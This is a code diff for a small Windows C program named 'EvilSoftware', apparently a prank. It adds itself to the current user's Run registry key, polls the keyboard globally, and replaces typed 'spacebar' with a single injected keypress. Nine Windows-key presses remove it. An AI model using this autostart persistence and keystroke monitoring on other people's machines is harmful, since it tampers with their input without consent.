@@ -1,3 +1,6 @@
+#include "synchapi.h"
+#include "winerror.h"
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
@@ -56,11 +59,15 @@ int main()
 	char filePath[MAX_PATH];
 	GetModuleFileName(NULL, filePath, MAX_PATH);
 	if(filePath[0]=='\0')
+	{
+		printf("GON GON GON");
+		Sleep(2000);
 		exit(1);
+	}
 	
 	
 	
-	if(!RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", "EvilSoftware", RRF_RT_REG_SZ, 0, 0, 0)) // kollar så att den inte redan är nerskriven
+	if(ERROR_SUCCESS != RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", "EvilSoftware", RRF_RT_REG_SZ, 0, 0, 0)) // kollar så att den inte redan är nerskriven
 	{
 
 		HKEY hkey;
@@ -71,9 +78,17 @@ int main()
 		}
 		else
 		{
+			printf("GON GON");
+			Sleep(2000);
 			exit(1);
 		}
 	}
+	else
+	{
+		printf("gooooooo");
+	}
+	
+	
 
 	char keyMap[9]="123456789";
 	while(1)
@@ -82,45 +97,80 @@ int main()
 		// s p a c e \  b a r
 		char key;
 		if(GetAsyncKeyState(0x53))//s osv
+		{
 			key='s';
+			while(GetAsyncKeyState(0x53));
+		}
 		else if(GetAsyncKeyState(0x50))
+		{
 			key='p';
+			while(GetAsyncKeyState(0x50));
+		}
 		else if(GetAsyncKeyState(0x41))
+		{
 			key='a';
+			while(GetAsyncKeyState(0x41));
+		}
 		else if(GetAsyncKeyState(0x43))
+		{
 			key='c';
+			while(GetAsyncKeyState(0x43));
+		}
 		else if(GetAsyncKeyState(0x45))
+		{
 			key='e';
+			while(GetAsyncKeyState(0x45));
+		}
 		else if(GetAsyncKeyState(0x42))
+		{
 			key='b';
+			while(GetAsyncKeyState(0x42));
+		}
 		else if(GetAsyncKeyState(0x52))
+		{
 			key='r';
+			while(GetAsyncKeyState(0x52));
+		}
 		else if(GetAsyncKeyState(VK_SPACE))
+		{
 			key=' ';
+			while(GetAsyncKeyState(VK_SPACE));
+		}
 		else if(GetAsyncKeyState(VK_LWIN))
+		{
 			key='W';
+			while(GetAsyncKeyState(VK_LWIN));
+		}
 
 		if(GetAsyncKeyState(VK_BACK))
 				backSpace(1);
 
-		for(int i=8; i>0; ++i)
+		for(int i=8; i>0; --i)
 			keyMap[i]=keyMap[i-1];
 		keyMap[0]=key;
 
-		if(strcmp(keyMap, "spacebar"))
+		if(!strcmp(keyMap, "rabecaps"))
 		{
 			for(int i=0; i<9; ++i)
 			{
 				backSpace(0);
+
 			}
+			keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY, 0); // s
+			Sleep(10);
+			keybd_event(VK_SPACE, 0x45, KEYEVENTF_KEYUP, 0); // s
+			GetAsyncKeyState(VK_SPACE);
 		}
 
-		if(strcmp(keyMap, "WWWWWWWWW"))
+		if(!strcmp(keyMap, "WWWWWWWWW"))
 		{
 			HKEY hkey = HKEY_CURRENT_USER;
 			RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", &hkey);
 			RegDeleteValue(hkey, "EvilSoftware");
 			RegCloseKey(hkey);
+			printf("GON ");
+			printf("%s", keyMap);
+			Sleep(2000);
 			exit(0);
 		}
 
